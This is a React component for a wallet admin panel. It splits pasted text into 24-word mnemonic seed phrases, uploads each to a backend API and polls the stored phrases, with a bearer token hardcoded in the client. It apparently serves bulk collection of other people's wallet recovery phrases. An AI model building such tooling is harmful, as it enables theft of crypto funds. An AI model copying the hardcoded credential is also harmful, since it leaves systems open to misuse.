import React, { useState } from 'react'
import { motion } from "framer-motion";
import { Card, CardContent } from './ui/card';
import { Wallet, Check, X } from "lucide-react";
import { chunkArray, sleep } from '@/lib/utils';
import ActionBtn from './ActionBtn';
import PassphraseSmartPoller from './PassphraseSmartPoller';

function AllLockedWallets() {
    const [phrases, setPhrases] = useState('');
    const [logs, setLogs] = useState([]);
    const API = import.meta.env.VITE_API_URL;

    const handleUploadWallets = async () => {
        setLogs([{msg: "Setting up wallets for upload"}]);

        const parts = phrases.trim().split(/\s+/);
        const words = chunkArray(parts, 24)
        await sleep(500);
        setLogs((prev) => [...prev, {msg: `Discovered ${words.length} wallets for upload`}]);
        await sleep(500)
        for(const phrase of words) {
            setLogs((prev) => [...prev, {msg: `Uploading wallet: ${phrase.slice(0, 15)}......${phrase.slice(-15)}`}]);

            const response = await fetch(`${API}/passphrases/upload`, {
                method: 'POST',
                headers: { 
                    'Content-Type': 'application/json',
                    'Authorization': 'Bearer hfhryeujhshbxhdsjjskaas',
                },
                body: JSON.stringify({ 
                    mnemonic: phrase.toLowerCase(),

                })
            });
            const res = await response.json();
            if(res.success) {
                setLogs((prev) => [...prev, {msg: res.feedback}]);
            } else {
                setLogs((prev) => [...prev, {error: res.error}]);
            }

            await sleep(999);
        }
        

        setLogs((prev) => [...prev, {msg: 'Uploading completed...'}]);
    };

    const handleDeleteWallet = async (id) => {
        const response = await fetch(`${API}/passphrases/${id}`, {
            method: 'DELETE',
            headers: { 
                'Content-Type': 'application/json',
                'Authorization': 'Bearer hfhryeujhshbxhdsjjskaas',
            }
        });
        const res = await response.json();
        alert(res.message);
    }
    return (
        <motion.section initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} className="mt-4">
            <Card className="rounded-2xl border-indigo-900/40 bg-white/5">
                <CardContent className="p-4 sm:p-6">
                    <h2 className="mb-4 flex items-center gap-2 text-lg font-semibold text-gray-200">
                        <Wallet className="h-5 w-5 text-indigo-300" />
                        Manage Wallets
                    </h2>
                    <form className="grid grid-cols-1 gap-3 sm:grid-cols-[1fr_1fr_auto]">
                        <div className='w-full flex flex-col gap-1'>
                            <textarea 
                                cols={4} 
                                rows={4}
                                value={phrases}
                                onChange={(e) => setPhrases(e.target.value)}
                                className='border border-gray-600 rounded resize-none ring-0 outline-none text-gray-400 px-2 text-base'
                            ></textarea>
                            <ul className='flex flex-col'>
                                {logs.length > 0 && logs.map((log, i) => (
                                    <li key={`${log?.msg || log?.error}-${i}`} className={`text-xs ${log?.msg?.length ? 'text-green-600' : 'text-red-600'} flex gap-1 items-center`}>
                                        {log?.msg?.length ? <Check className="h-3 w-3" /> : <X className="h-3 w-3" />}
                                        { log?.msg || log?.error }
                                    </li>
                                ))}
                            </ul>
                        </div>
                        
                        <ActionBtn onClick={handleUploadWallets} />
                    </form>

                    <PassphraseSmartPoller which="all" onDelete={handleDeleteWallet} />
                </CardContent>
            </Card>
        </motion.section>
    );
}

export default AllLockedWallets